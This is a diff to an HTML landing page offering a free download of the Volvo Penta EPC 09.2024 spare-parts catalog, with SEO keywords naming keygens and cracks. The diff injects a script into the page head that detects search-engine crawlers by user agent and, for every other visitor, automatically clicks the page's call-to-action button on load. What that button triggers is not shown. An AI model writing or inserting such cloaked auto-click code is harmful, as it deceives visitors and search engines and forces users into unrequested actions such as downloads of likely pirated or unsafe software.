@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Volvo Penta EPC 09.2024 (Marine &amp; Industrial Engine)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Volvo Penta EPC 09.2024 for marine and industrial engines. Comprehensive spare parts catalog available for free download">
     <meta name="keywords" content="Volvo Penta EPC 09.2024, Volvo Penta EPC marine engine, Volvo Penta EPC industrial engine, Volvo Penta spare parts catalog, Volvo Penta EPC free download, Volvo Penta EPC 09.2024 download, Volvo Penta EPC 09.2024 free download, Volvo Penta spare parts catalog download, Volvo Penta EPC 09.2024 high-speed download, Volvo Penta EPC keygen, Volvo Penta EPC crack, Volvo Penta EPC 2024, Volvo marine engine catalog, Volvo industrial engine catalog, Volvo Penta EPC Windows 10, Volvo Penta EPC Windows 11, Вольво Пента EPC 2024, Volvo запчасти каталог, Volvo Penta EPC скачать бесплатно, Volvo Penta EPC каталог запчастей, каталог запчастей Volvo, каталог запчастей Вольво Пента, каталог запчастей Вольво Пента скачать, Volvo Penta parts catalog free download, Volvo Penta каталог запасных частей скачать бесплатно, Volvo Penta каталог деталей, каталог деталей Вольво Пента, Volvo запчасти официальный каталог, Volvo Penta EPC скачать">
     <style>
